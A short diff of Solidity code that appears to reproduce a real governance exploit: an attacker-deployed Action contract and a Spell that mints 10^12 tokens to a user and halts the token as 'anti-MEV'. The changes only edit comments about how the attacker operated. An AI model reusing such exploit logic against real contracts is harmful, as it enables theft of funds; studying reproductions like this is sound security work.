@@ -14,7 +14,6 @@ contract Action {
 
     address public pans; // the attacker named the deployer after pans
 
-    // The attacker knew the Chief address in advance, we pass this as a constructor argument
     constructor() {
         pans = msg.sender;
     }
@@ -70,6 +69,8 @@ contract Spell {
         cgt.mint(user, 10 ** 12 * 1 ether);
     }
 
+    // Methods in attacker's spell. Used later on to perform the swaps.
+    // Not strictly required for the attack.
     function clean(IMERC20 cgt) external {
         // Anti-mev
         cgt.stop();
